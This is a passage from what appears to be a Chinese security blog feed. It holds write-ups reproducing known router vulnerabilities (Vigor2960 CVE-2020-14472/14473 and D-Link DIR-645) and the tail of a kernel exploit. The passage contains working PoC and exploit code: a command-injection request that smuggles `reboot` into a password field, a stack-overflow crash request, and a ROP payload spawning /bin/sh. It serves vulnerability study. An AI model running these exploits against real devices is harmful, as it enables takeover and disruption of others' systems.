punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%x\n\n", n);</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> p_pos<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%d\n", n);</span>    n <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%d\n\n", n);</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// print_hex(buf,0x100);</span>    <span class="token comment" spellcheck="true">// printf("\n");</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">0x28</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// print_hex(buf, 0x100);</span>    fd <span class="token operator">=</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/mychrdev"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    n <span class="token operator">=</span> <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> p_pos<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%d\n", n);</span>    n <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// printf("%d\n\n", n);</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// close(fd);</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-任意地址读写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vigor2960 CVE-2020-14472/14473</title>
      <link href="/2021/01/20/vigor2960-cve-2020-14472-14473/"/>
      <url>/2021/01/20/vigor2960-cve-2020-14472-14473/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="背景产品介绍"><a href="#背景产品介绍" class="headerlink" title="背景产品介绍"></a>背景产品介绍</h1><p>Vigor 2960 是一款企业级的VPN管理中心，通过灵活、可靠以及高性能的LAN to LAN和远程接入方案，为客户的商务活动提供了安全保障，同时也节省了成本，价格太贵就没考虑完整复现了。</p><h1 id="提取文件系统"><a href="#提取文件系统" class="headerlink" title="提取文件系统"></a>提取文件系统</h1><p>利用ubireader_extract_files来进行提取，不能使用binwalk。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/0.png"></div><h1 id="漏洞文件定位分析"><a href="#漏洞文件定位分析" class="headerlink" title="漏洞文件定位分析"></a>漏洞文件定位分析</h1><p>查看web管理端是否有在默认启动项里：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/1.png"></div><p>查看这个配置文件：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/2.png"></div><p>这里显示了加载的模块：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/3.png"></div><p>看看二次开发后的东西有哪些内容</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/4.png"></div><p>根据漏洞描述定位到mainfunction.cgi</p><h1 id="漏洞文件分析"><a href="#漏洞文件分析" class="headerlink" title="漏洞文件分析"></a>漏洞文件分析</h1><p>找到main函数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/5.png"></div><p>通过path_info和action获取功能分发</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/6.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/7.png"></div><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><strong>漏洞一</strong></p><p>定位漏洞功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/8.png"></div><p>命令注入漏洞</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/9.png"></div><p><strong>漏洞二</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/10.png"></div><p><strong>漏洞三</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/11.png"></div><p><strong>漏洞四</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/12.png"></div><p>等</p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>首先定位到url_decode:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/13.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/14.png"></div><p>有四个函数调用这个漏洞函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/15.png"></div><p>漏洞点一：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/16.png"></div>登陆失败，用户名密码错误会触发这个漏洞<p>漏洞点二：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/17.png"></div>这个不知道什么意思<p>漏洞点三：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/18.png"></div>超出了登陆数量限制<p>漏洞点四：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/20/vigor2960-cve-2020-14472-14473/19.png"></div>类似命令注入的触发方式，action分发功能的web_portal_bypass_ok<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>抄一下作业吧</p><h2 id="命令注入-1"><a href="#命令注入-1" class="headerlink" title="命令注入"></a>命令注入</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sys <span class="token keyword">import</span> argv<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> requestsdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"URL"</span><span class="token punctuation">:</span> <span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>    <span class="token string">"HOST"</span><span class="token punctuation">:</span> <span class="token string">"http://192.168.1.1"</span><span class="token punctuation">,</span>    <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"authuser"</span><span class="token punctuation">,</span>    <span class="token string">"formusername"</span><span class="token punctuation">:</span> b64encode<span class="token punctuation">(</span>b<span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"formpassword"</span><span class="token punctuation">:</span> b64encode<span class="token punctuation">(</span>b<span class="token string">"12345678`reboot`"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"PHONENUMBER"</span><span class="token punctuation">:</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># the known phone number</span><span class="token punctuation">}</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/raw"</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"root"</span><span class="token punctuation">:</span> <span class="token string">"http://192.168.1.1"</span><span class="token punctuation">,</span>    <span class="token string">"cgi"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"root"</span><span class="token punctuation">:</span> <span class="token string">"/cgi-bin"</span><span class="token punctuation">,</span>        <span class="token string">"uri"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"mf"</span><span class="token punctuation">:</span> <span class="token string">"/mainfunction.cgi"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">build_url</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> p2<span class="token punctuation">:</span>        <span class="token keyword">return</span> url<span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span> <span class="token operator">+</span> url<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span> <span class="token operator">+</span> url<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"uri"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p2<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> url<span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span> <span class="token operator">+</span> url<span class="token punctuation">[</span>p1<span class="token punctuation">]</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>build_url<span class="token punctuation">(</span><span class="token string">"cgi"</span><span class="token punctuation">,</span> <span class="token string">"mf"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="栈溢出（崩溃效果）"><a href="#栈溢出（崩溃效果）" class="headerlink" title="栈溢出（崩溃效果）"></a>栈溢出（崩溃效果）</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"UserAgent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) xxxxxxxx"</span><span class="token punctuation">}</span>    url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/cgi-bin/mainfunction.cgi"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"action"</span><span class="token punctuation">:</span><span class="token string">"web_portal_bypass_ok"</span><span class="token punctuation">,</span>        <span class="token string">"url"</span><span class="token punctuation">:</span><span class="token string">"http://"</span><span class="token operator">+</span><span class="token string">"\x40"</span><span class="token operator">*</span><span class="token number">0xFFF</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">,</span>        <span class="token string">"is_android"</span><span class="token punctuation">:</span><span class="token string">"true"</span>    <span class="token punctuation">}</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">""</span> poc<span class="token punctuation">(</span><span class="token string">"http://xxx.xxx.xxx.xxx"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器学习之D-Link DIR-645溢出漏洞复现</title>
      <link href="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/"/>
      <url>/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="官方漏洞信息分析"><a href="#官方漏洞信息分析" class="headerlink" title="官方漏洞信息分析"></a>官方漏洞信息分析</h1><p><a href="https://www.exploit-db.com/exploits/33862" target="_blank" rel="noopener">官方POC</a></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/0.png"></div><p>大概阅读一下得知漏洞存在于在cgi文件中处理http请求时POST的参数中的password。当password很长的时候并没有进行检查，导致缓冲区溢出。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/1.png"></div><p>我们看到漏洞组件authentication.cgi指向一个/htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中</p><p>逆向分析后定位漏洞存在的位置如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/2.png"></div><p>没有对content_length的大小进行检查，就直接通过read函数来处理，读入该大小的数据到栈中。那么如果我们输入足够大的size，同时又输入足够多的数据，那么必定会造成栈溢出。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/3.png"></div><p>超过0x408大小即可发生溢出。</p><h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>bash脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token comment" spellcheck="true"># 待执行命令</span><span class="token comment" spellcheck="true"># sudo ./run_cgi.sh `python -c "print 'uid=A21G&amp;password='+'A'*1160"` "uid=A21G"</span>INPUT<span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> <span class="token comment" spellcheck="true"># 参数1，uid=A21G&amp;password=1160个A</span>TEST<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>    <span class="token comment" spellcheck="true"># 参数2，uid=A21G</span>LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 参数1的长度</span>PORT<span class="token operator">=</span><span class="token string">"1234"</span>    <span class="token comment" spellcheck="true"># 监听的调试端口</span><span class="token comment" spellcheck="true"># 用法错误则提示</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$LEN</span>"</span> <span class="token operator">==</span> <span class="token string">"0"</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">==</span> <span class="token string">"-h"</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$UID</span>"</span> <span class="token operator">!=</span> <span class="token string">"0"</span> <span class="token punctuation">]</span><span class="token keyword">then</span>    <span class="token keyword">echo</span> -e <span class="token string">"\nUsage: sudo <span class="token variable">$0</span> \n"</span>    <span class="token keyword">exit</span> 1<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 复制qemu-mipsel-static到本目录并重命名，注意是static版本</span><span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-mipsel-static<span class="token variable">)</span></span> ./qemu<span class="token keyword">echo</span> <span class="token variable">$TEST</span><span class="token comment" spellcheck="true"># ｜ 管道符：前者输出作为后者输入</span><span class="token comment" spellcheck="true"># chroot 将某目录设置为根目录（逻辑上的）</span><span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/authentication.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"192.168.1.1"</span> -g <span class="token variable">$PORT</span> /htdocs/web/authentication.cgi<span class="token keyword">echo</span> <span class="token string">'run ok'</span><span class="token function">rm</span> -f ./qemu    <span class="token comment" spellcheck="true"># 删除拷贝过来的执行文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> ./test.sh `python -c <span class="token string">"print 'uid=1234&amp;password='+'A'*1160"</span>` <span class="token string">"uid=1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="溢出offset定位"><a href="#溢出offset定位" class="headerlink" title="溢出offset定位"></a>溢出offset定位</h1><p>利用脚本patternLocOffset.py创建1160个随机字符</p><pre class="line-numbers language-bash"><code class="language-bash">python patternLocOffset.py -c -l 1160 -f <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样我们需要从test获取payload：</p><p>找到offset</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> ./test.sh `python -c <span class="token string">"print 'uid=1234&amp;password='+open('test','r').read(1160)"</span>` <span class="token string">"uid=1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到溢出偏移为1050，那么后续就简单了，只需要进行rop既可。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用gadgets：</p><pre class="line-numbers language-c"><code class="language-c"># <span class="token punctuation">.</span>text<span class="token punctuation">:</span>0004C138 move    $a0<span class="token punctuation">,</span> $s2# <span class="token punctuation">.</span>text<span class="token punctuation">:</span>0004C13C move    $t9<span class="token punctuation">,</span> $s0# <span class="token punctuation">.</span>text<span class="token punctuation">:</span>0004C140 jalr    $t9 <span class="token punctuation">;</span> strco<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>来赋值第一个参数并跳转执行execve函数</p><p>最后执行execve(“/bin/sh”)</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/06/lu-you-qi-xue-xi-zhi-d-link-dir-645-yi-chu-lou-dong-fu-xian/4.png"></div><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"little"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>libc_base <span class="token operator">=</span> <span class="token number">0x7f738000</span>execve <span class="token operator">=</span> <span class="token number">0xae90</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x5a448</span>magic <span class="token operator">=</span> <span class="token number">0x4c138</span><span class="token comment" spellcheck="true"># .text:0004C138 move    $a0, $s2</span><span class="token comment" spellcheck="true"># .text:0004C13C move    $t9, $s0</span><span class="token comment" spellcheck="true"># .text:0004C140 jalr    $t9 ; strco</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1050</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>execve<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s0</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s1</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s3</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s4</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s5</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s6</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># s7</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># fp</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>magic<span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload1"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token 